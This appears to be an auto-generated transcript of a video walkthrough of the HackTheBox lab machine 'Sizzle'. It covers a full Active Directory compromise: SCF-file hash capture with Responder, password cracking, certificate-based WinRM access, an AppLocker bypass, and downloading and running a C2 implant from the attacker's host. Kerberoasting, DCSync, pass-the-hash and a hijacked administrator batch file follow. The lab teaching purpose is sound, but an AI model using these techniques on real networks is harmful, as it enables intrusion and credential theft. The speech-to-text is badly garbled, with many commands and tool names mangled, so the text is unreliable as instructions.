 what's going on YouTube this is if SEC I'm doing sizzle from act Abbas which is a really cool machine because it involved two really common ways to steal hashes and domain but after you crack the password each time there's a bit of a twist on how you use that password the first pass you get comes from a SCF file writing to a anonymous share essentially it's a file that maps an icon back to your machine so when I use it browsers that share he connects to you you have responder you steal the hash however in order you use that password you had to use not only Windows PowerShell remoting but you had to get a certificate signed by the Active Directory certificate authority so that little certificate signing into PowerShell remoting bit hard to figure out especially because Windows doesn't give you much error messages the second one is a simple Kerberos but because you're doing it from a Windows PowerShell remoting session you have that double hop problem the login session you have doesn't have any credentials so we can't access services laterally so you have to figure a way to change your login session to put credentials on the box in order to Kerberos the user which then can just DC sync so with that being said let's just jump into the box as always begin with an map so - SC for defo scripts as V and numerate versions oay output all formats but in the end map directory and call it sizzle and then the IP address which is 10 10 10 103 does take some time to run so I've already ran it looking at the results we have a whole bunch reports open so I'm gonna do something a little bit different and start taking notes I'm gonna hold the Windows key hit the left arrow to dock on the left side of the screen go over to cherry tree do the same thing with the right arrow key and then let's do I think it's ctrl shift and - Clear Channel node and just label it interesting so the first thing we have is FTP it's anonymous so what can we do with that let's open a new pane and check that out start going over to this window split the pane down FTP 10 10 10 103 anonymous anonymous we do well again LS - a to view everything including in files don't see anything I'm going to try putting at C passwd and we get an access denied so under this I'm gonna put cannot add files or see any files and then try again when we get creds I'm going to try it again when we get creds because maybe Anonymous is home directory is just in a directory that has no files if we walked in with an Active Directory account perhaps it will put us in the like there user folder where we can get access to files so the next thing we have is DNS someone do nslookup 10 10 10 103 nslookup and then server 10 10 10 103 and we can try a look-up on one 2700 one to see if it leaks anything about the first name of the box it does not we can try a look upon itself at 10 10 10 103 and it just hangs so I don't think there's anything there with DNS we have HTTP open on iis version 10 so is 10 is equal to either win 10 or 2016 and we have the nslookup failing we do have LDAP on 389 after is or HTTP and it's saying the domain is htb dot local so I'm going to search and I spoke up for HTTP local it does respond to us it also gives us an ipv6 address that we may want to scan as well if we keep going down we do have LDAP also telling us the common name in the form of a SSL cert and this says o dot h DB dot local so I'm going to put this here as well and we see the same thing as HTTP local letting us know that sizzle is the probably domain controller here because Sears would not h to be out local and HT b dot local resolve to the same address so i'm gonna get out of nslookup and we're gonna edit our host file to add this host name so let's do V Etsy host and then put 10 10 10 103 we'll call it sizzle sizzle HT be local and we'll also waveless HTTP dot local and h DB so anything along the lines of these requests resolved to the IP address we could have also edited the etsy resolved Kampf which is where the DNS server is the reason why I chose against doing that because network manager keeps re saying the file it's just a huge pain unless I stop network manager then to set a static IP it's just again not worth the hassle for this so let's go back over into our end map results we do have LDAP and this may be able to dump users then let's go down we have four four three so we should enumerate HTTP HTTPS are these the same virtual host routing so if we keep going down we do have four four five opens so if we ever hit an administrator account we can probably just PS exec into this LDAP SSL and that looks like it's about it we see a clock skew is six minutes off which is fine and we also have message signing is enabled and required so we can't do any type of ntlm relay attacks not that it matters because there's only one host on this network and that's itself so since we had so many different ports I'm just gonna do n map - P - - oh eh I'm gonna do and map sizzle all ports and that should be good oh we have to put the IP address of DA 10 10 10 103 so I'm just gonna rename this pain to n map it already did open up a new one and let's see let's just go down the list let's look at LDAP then HTTP and see what we have so I'm going to hit Windows key L a left arrow to undock and Windows key right arrow to undock and I'm just gonna hit please subscribe to reset my window sizes if you want to know exactly what that did we can cat that file and show you the script it just uses WM ctrl which is I think windows management controller to set all the window sizes so everything is a uniform so let's move on and check the web interfaces before I run go Buster I'm just gonna go to manually take a look 10 10 10 103 and we also want to do HTTP 10 10 10 103 and we get this we just have a picture of bacon sizzling I'm going to search for robots.txt we don't have anything and I'm also going to do sizzle we probably do HTTP sizzle and we get the same exact page so no virtual host routing let's take a look at this certificate and depth so we'll click view here and right off the bat I noticed something unique the common name is HDB - sizzle - CA which is a certificate authority so it looks like someone configured a circa thority on this box which is odd we haven't seen that really before so let's go back to cherry tree and say certificate authority so keep going down we have cnc htb local and i'm really looking for like just alternate names something else this box to be called don't really see it we do have July 3rd 2018 when as a cell strip was created so certificate authority sizzle htb CA and created July 3rd 2018 I believe it said so I think the commas there so we can answer this question yes and no for virtual host routing so before we poke at LDAP we want to do some type of recon the background so I'm going to launch go Buster when do - you for your L HTTP colon slash slash 10 10 10 103 and dash W for list users share word list dirt Buster directory list 2 3 medium dot text and that should be good for that so let's take a look at LDAP we use this in depth and the Y puffy video so I'm not explain too much but wood stood off with LDAP search which is the command - X to do simplification - H for host and we can say sizzle HTTP local - s - search the base I think the default is sub and we want to display naming context so we can see this is definitely active directory because we see these things which is just default configuration of AD minus the 8tp local this is the domain so we have the domain and then some other things DNS stuff so let's see if we can dump anything out of HD beat local so we'll do - s sub and - B I forget what B stands for um it searched the base so I will specify the base as DC HDB and DC DC equals local and it fails right away saying in order to perform this operation a successful bind must be completed so we need authentication before we can do anything so let's go back to cherry tree oh damn this may be what dumped users need and account so what do we have here we don't really have anything we've ran into a dead end we do have go Buster running go Buster just found slash images so that doesn't really do anything so let's go back to the ad map config and this is still running I sure did - vvv so we could have the status as we go but I'm just gonna pause the video and let this and matte finish and then we'll view the results it's been about four minutes and I just realized there's something we forgot to do and that is there is something we do with SMB so if we look at SMB we could view shares maybe and with admin PS exec so let's take a look at all the shares so SMB client well first we'll use SMB map and we'll specify - capital H 10 10 10 103 and we just have this fail we could try like usually user and do null and null for password and try to do like some type of nullification and we see guest SMB session established instead of user SMB accession established but still nothing so let's try a different tool SMB client which is the native like SMB tool on Linux - N for NOLA sonication and - el tule shares 10 10 10 103 and let's see if this gives us anything and it does so we have quite a few shares the one that really sticks out first is operations so let's do SMB client get rid of this - el and just do slash operations and see what is on this so LS - a and we just get access denied so there's nothing we can do on that share there is another share that is unique which is Department shares so let's specify this and see if there's anything here if we do it LS we have a bunch of information so let's mount this locally so mount - TC ifs CIFS is the like SMB name I think it I forget what it stands for but when you see that just know it's SMB then we can do the location slash slash 10 10 10 103 department shares and to /mnt so let's see password for root let's just do nothing and resource busy let's just you mount /mnt maybe i had it mounted for something else and try this again and I think if you just don't do anything it does like no less education a guest so if we do LS /mnt we have a bunch of files so let's go in there and do a fine dot - LS and we will actually T the output - ACB boxes sizzle and let's make derp SMB recon so SMB recon slash tree txt root HD boxes SMB or ec o n oh we have to do t I said it I think I didn't type it so T is just going to display the output as the command runs and then output it also to a file so this is going to take quite a while I'll just let that run and while that runs we can go into mount do LS - la to list everything again and this is so swell so let's just see if we can write to something or access a file while that runs HR or IT is always a good location we go NIT do an LS - la and we don't see anything if we try to touch a file to test we should get an access tonight I think because I don't think we have access to this directory yes we don't even though if we look at the permissions and Linux it looks like we should because hey we are root and the owner has read write execute windows just Linux just doesn't parse the permissions of s and B well so what we're going to do is instead go back up one and then say let's do for I and LS do echo I done and that looks not good I say not good because we should have department shares oh no no my net is good department chairs is the share name so we'll find there so there is a command in Linux called SMB cackles which is just like SMB client if we specify - n 10 10 10 103 department shares and then we just do something like slash users we should get information about this so we could see the owner of that is built-in administrators everyone has read access and administrators have full access anti-authority system has full so list all the permissions of the directory so what I'm going to do is go back to this echo command and we'll do echo I and then SMB cackles - and we got to put this in single quotes 10 10 10 103 slash department share /i and I think that oh no / department chair and then right here and that should be good so let's run this and see if it's working it's looking at accounting we have bad Network name so I forgot the S on shares read on this accounting and we have it starting to output so the find has finished we have a bunch of files and Zizi archive so let's go into this and then do LSL a actually I didn't need to do that we can just cat a file but let's look at we can just do file against these all and see if we can sort by filename easily and as I do file ster we see everything is going to come back as data if I get something back I can just PI control see this we can xxd a file and look at it and we see the files are just covered with dog bites so there's nothing there we can do x XD stir and then grep - v4 disclude and disclude everything with a full line of zeros and see if there's anything and while it goes we still have this SMB cackles running I guess you can't xxd star we'd have to do a for loop but because how slow this is to view every file I'm just going to move on and let's just say we reviewed all the output and we see SMB cackles has um 10 10 10 103 department shares put this in single quotes because there's a space in the command if we look at users public we will see that this one is writable so group users ACL everyone and full access to it so we can write to the public folder and when you can write to a directory there is something called s CF files in Linux so if we do s CF steal hash and let's go to we can just go the first ones fine and this is forget what it's called shell command files essentially it's creating like an alias that says hey the icon is over at this IP address and when Windows Explorer opens that directory it tries to pull the icon and when it does that it attempts a authentication and you can potentially take the hash of that authentication so let's see that in action so let's do CD SMB recon let's just put this stuff here V steal hash dot SCF we can set move to paste paste this in and do all right P address which is ten ten fourteen three I believe if config tun zero it is ten ten fourteen three and we can just leave everything the same I think command equals two and shell I hit forget forgot to hit I to go in insert mode and paste it so it missed some things but that looks good so we can now upload this file into that users public so let's see P steal hash mount users I sure just type that public and before we do that let's just see what's in that directory if we have a desktop directory that's probably what I'm gonna put it because soon as a user logs in on that box users public desktop is mapped to everyone's desktop so we may get a quick win there looking at this directory it's just completely empty so I'm just gonna put it in users public and before I do that let's do responder - capital I for interface ton zero and this will allow us to steal the hash if one connects back to us so copy the SCF file over there and we will now just play the waiting game Oh I've done this box once before and it's already got the hash oh it's not showing us so let's do locate respond ODB and we will delete this file and do it again and finally probably about after five minutes we have the hash for a user I'm going to copy this hash and we're going to go over to the Kraken box to begin cracking it so we go CD hash cat if you don't have a Kraken box like I do chances are you don't just use your host machine I don't like cracking in VMs because VMs are very slow at cracking so I'm gonna call this says old on net ntlm v2 will paste this hash in and then do dot slash hash cat - - example formats and did it say in that ntlm v2 or do I just know that it's just something I know oh it does net ntlm v2 hash but ntlm B - ash so maybe it's example format hash cat - H grab example example hashes and then we can search for a net - and we can just search for MTOM v2 and we see that is mode 5,600 and this is what it looks like so let us do - m dot slash hash cat - m 5,600 hashes we called this sizzle dot net ntlm v2 and we'll do off to word list rocky text and begin trying to crack the hash and we see already it has cracked it and the password is a share 1972 so let's go back over to cherry tree and create a new child node will call this creds Amanda a share 1972 and I always like putting a note how I got the account and this was SEF file on users public to net and Tilly mv-22 cracked so when you're doing the report you always know how you got the hash so let's go back to terminal and we can exit out of this exit out of this we don't need responder start cleaning these windows up don't need that we can just go back into HDB sizzle HTV boxes sizzle and I'm gonna run SMB map again so SMB map - you Amanda - D for domain and there's going to be HTTP dot local - P for password paste it in and - capital H for those 10 10 10 103 and this is gonna tell me if we have any additional accesses so I see right away that admin and C has no access so I know this user is not an admin so I don't even have to worry about trying to do a PS exact or anything operations no access so don't really have any extra access we see a certain role directory and this is normal for domain controllers so main controls have a cert sov directory that go Buster is not finding and I believe it's not finding that because of the status code so keep meaning to either add it or ask o j to add it but i hate having like status codes as a whitelist I'd rather just blacklist the ones I don't want so like blacklist for 3 301 because since I think it's for one for unauthorized but since that's not here we're not seeking on the results so if we do the test the directory name is certain CoV a cert SRV it's a default directory on certificate authorities so we can do the same go Buster command with the word list test and we see nothing comes if we do - s for status codes and we put like 401 which is what I think it is we do see it show up now because we are watching for that status code so if you don't like go bust you may want to use like w fuzz or there's a bunch of other ones I mainly like go Buster because I can use it on machines after I exploit them because it's go and creates binaries everywhere so I don't have to do proxies which as well if you want to know what that looks like if we just go to 10 10 10 1 or 3 / cert sov it just prompts us for HTTP authentication so well it does that we can do Amanda and try well htb backslash Amanda and then a share 1972 I think it was let's just copy and paste it because I can't type so HTTP backslash Amanda paste Amanda paste and probably because it's a domain control you don't have to specify the domain name it's thanking and we'll come back to that because that is taking its sweet time so let's look at this add map command which has now finished so we have a listing of all the ports we do see that when remoting is enabled and the port's 5985 and 59 86 this is WS man this is I forget what it stands for but essentially this is PowerShell remoting and we did this in the full chrome video so I recommend going to that but the TLDR for doing it on Linux we do have most education they have be just Google when RM I'm gonna do Ruby this needs to be the best implementation I found so you have this script which is going to just one PowerShell command we can I don't want to do this because there's other things we'll have to do but it just runs one PowerShell command at a time which is annoying element from HDB I'm probably mispronounced that has a updated version out there that gives us an actual shell so this code is very similar just a bit better because it gives us a shell so I'm gonna copy that and name this PS remote Barbie and we have to do set paste paste this in and let's do i pianned port this is going to be sizzle HDB local and the port 5985 WS man username a CB Amanda password is whoops is going to be a share 1972 so we can try running this and if you get an error running this that um the script doesn't work do gem install win RM you can see win or M up the top here with a require gem is how you install things in Ruby so you just do gem install win RM and it will install that gem for you it's just like pip if you know Python so when it in this we got an SSL yer wrong version number so let's go here oh we had the endpoint at SSL and when you do I think remote connections you have to use SSL with Windows remoting they don't do plain text and I think the port is 59 86 for SSL so let's run this command again and we just get a random error message saying parse so this takes I guess a lot of just guesswork and the box is set up to not allow username password authentication it uses certificate authority certificate authentication so we have to do that so we're going to abuse having access to this Active Directory certificate services and generate a certificate and use that certificate so we'll do open SSL gen RSA AES 256 - L will call this Amanda key and say the bit length is 2048 I'm just putting password for the key you need a password for this and we can do a certificate signing request with open SSL request new - key amanda key out Amanda dot CSR so we're taking the key and saying hey we want something to sign this and claim the request so let's just make adder remote and move PS remote and every Amanda into this to stay organized so we have the CSR if we cat this there it is so we have to get this signed and to do that we go over here request a certificate advance certificate request we could probably have this generate the cert for us but I always like having full control over the private key when possible so I just pasted the CSR into this text box click Submit and this could take a minute or so because the box is slow but on the next page we'll be able to download the cert I believe there we go we're gonna download in base64 format download the sir it's called certain Uzi or it's saved so now we have a certificate that is signed by our certificate authority using the amanda user so that should allow us to authenticate if the endpoint uses SSL authentication for PowerShell so copy downloads was at certain nude something certain new dot cert OCR I'm just call this Amanda dot CER so now we got all the files here we can begin modifying the code to allow SSL certs actually before we do that let's just look at how the certificate is signed since I said it was signed by Amanda but we never really specified that when creating the private key so I'm doing open SSL x.509 which is the type of suit this is I'm going to do Amanda see her - text and we can get the output if we go all the way up here we can see the issuer this is what the certificate authority put is HTTP sizzle CA and the subject is local htb users Amanda and if we're doing an LDAP query you just put this in Reverse or be CN equals Amanda CN equals users DC equals HC b and d c equals local which we'll probably do actually if we do powershell remoting we'll do it after we'll play with odep a little more after we get the script working so we have to remove the user and password because it's trusting what the certificate authority says and we can say client cert is equal to Amanda see huh and then the client key which is the private key is equal to Amanda key and we need commas and that should be it so let's do Ruby PS remote or B the passphrase for the private key which was password and come on login maybe we did something wrong VPS remote CD remote B oh there we go it just took its sweet time so we can do Who am I Amanda I'm gonna do CD dot dot go up a directory so we see we have a shell but before we go on let's play with LDAP a little bit so before we did LDAP search - X - H sizzle h DB local - b DC equals h DB DC equals local I think that's command we did and we see nor deployments operation it yeah a successful buyer must happen so we can specify - capital D for username Amanda at HT be local and then - W for the password and it's gonna be a share 1972 and I forgot - and the single quote and now it's dumping information from that base so if we wanted to we could even take that a step further and say an actual query so write an LDAP query let's just put backslash to start this on a new line so it's easier for you to read so it's going to be this then object class is equal to user and we want this to be member of C n is equal to domain admins C n is equal to users TC is equal to HT b and d c is equal to local I may have had to put this in single ticks because it has a space bad filter put this in double quotes bad search filter so I screwed something up C oh I need to end the parentheses there we go so now this only showed us the domain admins so if we grep for Sam account name we can see the two administrators are administrator and sizzler so that's how you manually do LDAP stuff with Active Directory I'm sure there's an enumeration scripts out there but I just wanted to show this because I don't know the next time we have an ad server to play with so let's get back to the powershell remoting so Ruby PS remote and the passphrase of password and we are on the box so if we do it LS nothing we do LS here we have desktop so let's see if we can find the user dot txt it's not here let's go up a few directories do an LS and we have a bunch of users administrator amanda mr lky public what not so let's just run bloodhound to enumerate Active Directory since we have a session and we've done this a few times you can search it Zack bloodhound to learn how to use it but we're just gonna jump the gun and do it quickly so make dude dub dub dub and I'm gonna go before I do that bloodhound do a git pull to make sure everything is up-to-date and then we'll copy opt bloodhound in jesters show pound ax C here there we go and we have to start a web server so we can download and we can just download this with IE X so let's go to a place we can write so let's go into Amanda it's going to ask passphrase randomly I don't know why the connection dies but let's that go test to test and we can verify we can write thereby doing type test yes we can right so let's do IX new object net dot web client download file HTTP 10 10 14 3 / shut pound Exe and we call this shut hound exe that wall looks good at the end of the passphrase again and we are in constrained language mode only core types are supported in this language mood so let's try invoke web request I think it's you can do invoke web request like that or IWR for short and we can do - URI the URL shoot I did open link copy and - out file shut pound exe password and if we are in a PowerShell version that has this it works so this is blocked and constrained language mode to download files but invoke web request is not so we can do dir we have show pound so it's execute show pound dot exe and it is blocked by group policy so this is where I'd go to app Locker bypass this API Oh cradle and there should be a list policies no generic BFI tepako bypasses that is wall bins generic a bunch of places that users can write and C colon backslash windows and generally this directory is white listed so I'm going to do sequel and windows temp first since that's new at the top of the list so copy sharp pound dot exe to see : windows temp and hit password and CD back slash windows temp and let's execute shut pound dot exe mistyped it shut pound dot exe and we see it is now running it is doing a few collection methods group local admin sessions trust RDP and D calm and this is going to be an issue also we have to get files off this box we can try net use maybe not user work so let's do make duress mb SMB SMB server and then I think it's the share name actually forget the syntax real quick let's do SMB server and share a name and share path so we'll do if sac PWD and we'll do net use z : 10 10 14 3 hips ik and see if we can mount it oh let's see network name could not be found 10 10 14 3 that's weird let's add - SMB to support I think that's the flag and try this again doesn't look like any kid successfully it's weird that's H share name and share path what did you share a name of test so try this one last time ten ten fourteen three flash test password can't find it let's just try copying it directly there maybe it'll work copy this to ten ten fourteen three test and it's taking a while so I think it's actually copying while it copies let's do neo4j start and let's do neo4j console I don't like that error message I think yeah mess is fine let's just do bloodhound and see if we authenticate so we have logged in to bloodhound and we don't have any data in here so it says no data so let's open this files and we'll drag and drop the file we just got so ctrl L to edit enter the mode where you can just type things so we'll do root htb boxes sizzle SMB and it did not copy the file it took a while but did not I don't have a good way off top my head to do this so let's do something slightly different and start loading a CT framework so we used covenant on the last box let's use Covenant again because we're doing it from Linux this time so we Google covenant github and follow the instructions for installing it we should be fine so there is a docker run command it wants to do so first we go into covenant covenant dr. build so CD opt do we have it yes we do so dr. build and then after that we'll run this command so I guess I'm gonna build elite while this builds because it does take some time so dr. build dot and these two are virtually the same thing so covenant is the server aspect and elite is the client that connects to the server it's done this way instead of like Metasploit which doesn't both so you can have multiple people on the same exact c2 so pretty cool so everything is now built we can do the docker run - I T - P and we're mapping port seven four four three on our host - seven four four three on a docker container we also want to map port 80 and 443 because these are the two most commonly used for its before we do 80 we have to go over to a Python and kill our HTTP server well we'll have a conflict so now that the ports are map let's give this docker a name we'll call it Covenant probably misspelled that and then - V we have to share a directory so we'll do a current working directory slash data and that would be opt covenant covenant data and then map it to app data because that's where this is telling us to do it and after that we call it covenant and we'll do - - username will call this EPS ACK and I think it will ask us for password will put please subscribe so now we have started covenant let's go and elite and connect to it so we'll do dot go run IT and I always do RM so we delete elite first if it already exists you do like I think doctor start - AI if so I can show you real quick because this doctor container is running if I do this command again we have the container already exist so we do dr. Stewart covenant - eh I think and then put the password of please subscribe and it starts it back up so that's how you resume but for elite since it's just a client we don't need it and we have to specify the - v BW d / data and then app data elite username hip sack computer name or do host and we could not connect oh I can't connect to loopback while using docker because the loopback maps to the host interface we have to give it our IP address which is where which will hook into docker so give it computer name 10 10 14 3 we connect to it put the password and we can put the Hat certificate this prevents man the Middle's if we know the certificate if we leave it empty it just trust everything and if you don't run this via doctor I don't know why but just native Kali it never trust the certificate even if I do empty to trust all so that's why I use docker like they recommend in the github so now that we have covenant we can do I think list or show show to see things we got grunts launchers and listeners we have to start a listener then we can start at launcher then we can get grunts so grunts are the agents so I'm doing listeners I guess I already have one so we can do is it stop or zo2 let's do help interact with this one and we'll do stop so already had a listener running which is odd but I was just using it before so let's do let's go back to the beginning go into listeners let it stop so that's fine we can do HTTP to create a HTTP listener we can set the connect address to ten ten fourteen three we want the bind port to stay the same and that looks fine so let's do start to start the listener we see we have successfully started it we go back back we can do launchers and let's do a binary we do set listener name to be the list no we just started which was 48 whatever and we can do help and set launch a string and there's going to be what you name the binary I'm going to call it C to exe and then we can do host well launch a string I didn't need we can do that here host and path so forget I did this I don't think you need it but if you air out then do it so host and we'll call this please sub dot exe they do help show we see yes the first command sets this launch a string variable but what that did was it hosted this file on the web server so if we had done generate it would have just generated the file but doing host allows us to host it so we can download it so let's go back into a shell so let's go into remote Ruby PS remote or be put the password in come on there we go go into Windows temp we can do IWR - URI HTTP 10 10 14 3 / please sub Exe and then out file of pls sub DXE so this will download the file then we can execute the file go back over to run and wait we can see go over to a leaden weight we can see in confident this string appears because it called back and then an elite we do have the grunt - nine eight one one has been activated so we can go back back and then do grunts interact two nine eight one one the one up of here is remnants of me doing the machine before to run through it so for these insane machines I generally do it the day before I record a video just to make sure all my notes are in order so from here we can do list I think or help and see everything we can do so we have commands like seatbelt safety cats Ruby SDC sync just essentially the ghost pack so we can run seatbelt user to run the user checks and eventually this will come back we could also grab Watson and run that to see if there's any patches we can abuse spoilers there is now because sandbox escape or at least a few things we won't be doing that here will do the Box the intended way that way so have some files entries nothing too interesting so let us do I think Kerberos is its own thing so I'm just gonna run Kerberos from here and probably shouldn't have done that but it's generally something I do when I get a low privileged user on a domain is attempt to Kerberos and see what comes back and no did not work Amanda cannot do Kerberos ting so let's run bloodhound again so let's just do assembly and then see : windows temp shut pound dot exe oh oh oh uh when I do assembly that's actually hosting off my box we could do shell and execute it manually but let's do a reflective injection because hey we can so before you do that we do have to do one thing and that is copy opt bloodhound and gestures shut pound dot exe into opt think elite data elite Elite data and it may actually be covenant so let's do LS opt covenant covenant data what do we have here come to DB run don't have anything here so it's definitely a weap so elite will grab the file so let's do Oh assembly this way did work so you can specify local files or remote so that's funny will do assembly app data shut Pound dot exe and about an option set local path assembly I don't know what this air message is coming from won't see if this actually executes oh we did assembly assembly what do we do I'm guessing because I typed assembly up here we got output and I typed assembly again and put it twice because you can see me running the command assembly assembly so just run it once and we have it we can download the file so download but we can't have that period at the end of it so let's get a new thing copy opt elite elite data downloads not there update DB and I'm going to do locate to see what that file is if we've got it yet bloodhound docker okay assembly we should have it download this okay we have downloaded it we can do locate paste and we don't have it maybe update DB finished after I did that let's go to the previous file let's go to this one there we go so it is actually in both Haupt covenant and opt elite we go /opt elite data let's just copy it sorry about all this moving around I actually didn't use covenant when I was testing the machine so let's just copy that here put it in single quotes there we go so now we can go here go to sizzle why don't we have the file oh because it begins with a period oh it's tertiary MV stars if to be H zip oh god darn it MV there we go dude BH zip it started with a period so it was hidden I'm gonna make a temp directory all quick and copy this to make sure the files are in here so CD tab unzip BH zip yep we have the files so there it is here's bloodhound finally getting there to copy processing and we can run through the queries so we can see like find all domain admins we can see that here we can do see show paths from Kerberos table users doesn't have any find principles with DC sync rights doesn't have any so the thing I was mentioning before is coming into play and I think it's because we're on a domain controller if we go back to docker the wrong pain here we go and we see the collection methods I don't think these are enough collection methods probably because again we are on domain controller we go over to shut pound github we can see the collection method all performs all collection methods except these two so let's do all with these two collection methods so let's try assembly collection method all comma GPO local group on logged on and run this again it has finished downloading so let's download this file can do download go back here CD we can what was it dot backslash I'll just copy it manually so it was in up elite elite then data downloads dot backslash to note puts in downloads just this sweet so we can copy this to our current working directory if we do LS dash that way we can see it's actually smaller let's look back at bloodhound see assembly resolved collection methods to group local admin trust didn't actually do the collection method let's try this again - - collection method all gpo local group logged on si ran the command let's see if the collection methods come back maybe its collection methods go back here and it just says collection method let it run and see what happens there we go so I guess maybe this is case sensitive but we see many more options here than before we can see it ending right here but we got more things so let's copy this go into bash and we will copy the new file but first we have to download that file download and then copy it LS la we can see this file is much bigger than the previous one so now we have more data and more data is always better so let's go to bloodhound go to files drag the new copy in and see if this shows us anything different so I guess I can maximize this window find all domain admins that's the same we can do is show paths from Kerberos table users and we have mr lky as a Kerberos table user so we click them no data returned principles with DC sync rights and we have a big graph so let's look at this administrator's a member of domain admins and then member of administrators and he has domain sync rights to HT V dot local through the ACL get changes domain admins this is sizzler so that's expected we do have one way off here mr lky looks like he has DC sync rights and it says get changes all and get changes so if we right-click on this let me have to zoom in to do it easily nope there we go nope there we go we can do help it gives us information about this it says the user has this DS replication get changes on a CB dot local individually it's not a bad deal however with the replication get changes principal they may perform a DC sync right so if they have changes all and changes then that's when you can do DC sync and if we look here we do have both sorry for the small print I don't know how to make that bigger so we have the user MLK lky having those rights and if we look at paths from Cobra suitable users bloodhound is telling us we can Kerberos with him so let's try that Kerberos thing again because I'm not sure why that fill now hello Kerberos let's just drawn Kerberos and see if it does anything different and while that runs Kerberos we can do user name next mr lky if it fails unable to create credential oh so I know what's going on we have a double hop problem because we used Windows remoting this network credential doesn't have a session doesn't have the ability to authenticate because we authenticated via a I think Kerberos ticket or something but essentially there's no password for a session because we didn't authenticate with the password so when we're trying to do something different and do another query it can't do like single sign-on things to take our password so we can do something and covenant called make token and this is going to create the token for us and at the end of the video we'll go in its show exactly why there's double hop things an issue what it is I think in fulcrum we also explain it and work around it without using make token by using run as I think it we did but make token is the better way to do it so we can do help make token I don't know if it has helped so make token use name domain password wall gun type so we can do make token Amanda HT be a share 1972 and now we have a token with our password so when we run this Kerberos thing again it will be able to authenticate so again at the end of the video we'll go into it I think you have to be a shoot what is it local administrator to fully show how this works so that's why I'm doing it at the end so we have a care bt GT ticket or not that that's not what I said TGS ticket ticket granting service ticket is what we have we don't have the golden ticket which is krbtgt we have the ticket granting service not ticket granting ticket Kerberos and the acronyms is a pain so let's copy this and go back into Kraken CD hash Kat V hashes sizzled dot TGS paste and then dot slash hash Kat example hashes PGs and that is mode 13100 so dot slash hash cat - em 13100 hashes sizzle dot TGS and then we use oft word list rock eel let's do the hashes sizzle dot TGS that's Dalek a qb5 TGS what is a wrong give me five TGS 23 I'm just going to copy this and paste this so kb 5 TG s 23 users their realm is there the SPN is there and this is using a oh no this is user edible that's fine then you do dollar the hash that should be good oh shoot nope that's all in one line let's do WC - shell hashes / sizzle TGS yes it is one line separator unmatched dose to UNIX hashes sizzle and try running this again maybe I have the wrong format so let's let's put this pain do ash cat - - example hashes clip - a 13 100 and - a three four three lines after that looks good and V or hashes sizzle so we have dawa matches dollar KBT GS and dollar $23 fellow $23 we have a store we have a store user user dollar dollar goes back to here I think maybe I need that star I don't know why it didn't put that for me but now let's try it there we go oh my god that was infuriating actually so not sure why it didn't have that but I guess a bug may be in covenant I don't know where the bug exists there but there's a bug somewhere because we had copy and paste it and just missed that one but anywho we have the password as football pound seven so we can go back into covenant and we can do make token mr l KY h DB and the new password and now we should be able to DC sync and we probably should specify a user so let's do sizzle instead of administrator c DC sync sizzle is it going to work and this is just extracting the password hash out of the NTDs did file on the main controller essentially essentially and let's see here are not found go back to let's just do administrator see if this one works maybe it's sizzler maybe it hadn't are at the end there was a user let's see here we go so we got an administrator and we can go to his ntlm hash copy this and now we can PS exec by I think it's just administrator app let's just try that administrator at 10 10 10 103 put the ntlm hash for the password let's do maybe it's - hash target command - hashes and at once LM hash then ntlm - the LM hash is ignored so you can just do ntlm twice requesting share uploading a file and come on get its get us much more call it a shell this is taking a while just hit enter still no shell still waiting huh doesn't was it that one works let's try WMI exec administrator at 10 10 10 103 - hashes paste the same thing and see if this one works faster there we go so W my exec worked I don't know why SMB exec is not but if we do dir it is slow but hopefully it'll come back yep so Who am I and we're administrator so let's go and show you the double hop problem so let's go to Windows temp and execute grunt which I think I already named P dot exe off recording go back into grunt which i think is paying six yep and see if we get a call back let's just download this again six where is it info web request that's in Ruby password that's not working everything is falling apart PowerShell we want to do double quotes IWR - u RI HT b 10 10 10 14 3 please sub dot exe - out file b dot exe see if this downloads it can't use it because in the process maybe the dot backslash thing was a PowerShell thing I'll just execute it with PXE and it works I think cannot find the specific file no I guess administrator doesn't have permissions to this file let's call this sub dot exe there we go let's execute it and it doesn't look like I'm getting an error message so that was probably the issue come on get a shell where as administrator can't find the file CDI our show Commission the whiskas directory file exists this must be something weird with this w my shell see : windows temp sub dot exe let's get out of this directory and we're just downloaded here so download it try it again if this doesn't work then I guess we may just upload mini cats locally to this box dot slash sub dot exe so I'm dot exe this way do ya it exists can't find it let's exit this and do C : so dot exe maybe we can execute this way target command cmd.exe /c that's how I should have executed in W my shell let's try that sorry about this no idea why this is taking so long to do this something doesn't like me I can't show you how the double hop thing works we'll just do it in a separate video CMB dot exe slash C sub dot exe cmd.exe /c seafoam backslash sub dot exe okay let's just try a guess hosting mini cats locate my cat study XE CP this do dub lub dub C of dub Python simple HTTP server on port 8000 so PowerShell I've WR for enfoque web request URI HTTP 10 10 14 3 what 8,000 and this is mimicked at star exe - al file Mimmi Katz dot exe and I'm not even sure how to get to window 10 I normally don't go this I end week at study XE so you can tell me if can't find the file cannot execute the specific program copy mini cats dot exe dasi : windows tab contains a virus so I know what I want to do I'm gonna try one last thing so P kill that actually won't work because of UAC I just have to show you the double hot problem next time but essentially when you do a network login through PowerShell it's a certificate it doesn't save the password or it's a Kerberos ticket again doesn't have the password the ticket you have is to the Machine you are on so whenever you try to do some type of remote thing it just doesn't work because the logon type doesn't accept that so when we did make token we physically made a token that had a normal wall gone session that wasn't a networked session so we could reuse the ticket we got so that is the double hop in a nutshell so we were administrator so let's do the two unintended probe asks the first one is really silly and maybe we'll be able to which we'll call it get the new shell working so the first one if we go back into Ruby and we adjust the Amanda user we can go into the administrator folder in C colon backslash users administrator go into documents so C colon users we can go into administrator and we can do dir but we have mission denied but for some reason amanda has read access to this Documents folder if we do dir there is cleaned out that so we can do cackles on cleaned up that and find out we can actually write to it because Amanda has full control over it so if we just do echo let's do C colon backslash what was that program dir c : password dir slash echo C colon backslash sub dot exe to cleaned up that that should be fine may 1 echo cmd.exe /c c colon backslash subject C to clean bat I screw up this first command I just realized I have the quotes going around everything so if we type cleaned up at what do we have will we deleted the cleanup piece because we didn't put a new line so let's do echo cleaned up at O we can delete the file cleaned up that now when we type it we get an empty file so let's do echo cmd.exe /c c : sub dot exe to clean bat so there we go administrator runs this every like five minutes and wait does he'll execute sub dot exe so the other intent uh Nintendo asked is something that is probably common but not as calm something common but many people don't realize it and it's the forensic evidence your tools leave behind so if we start looking at what's in system32 either mr. Ben or I think lucky 37 accidentally ran a tool that placed something sensitive in the current working directory of the box I'm guessing they were local system when running a PowerShell script that dumped to a file called file dot txt and I wonder if we have it now file dot txt has not shown up yet this dir command takes a while probably just passed there we go so we see on July 11th 5 th T got created and when C : windows system32 i'm just ctrl c and redo the shell because that dir is gonna take a while password maybe the whole process is home waiting for that nope there we go see hole in windows 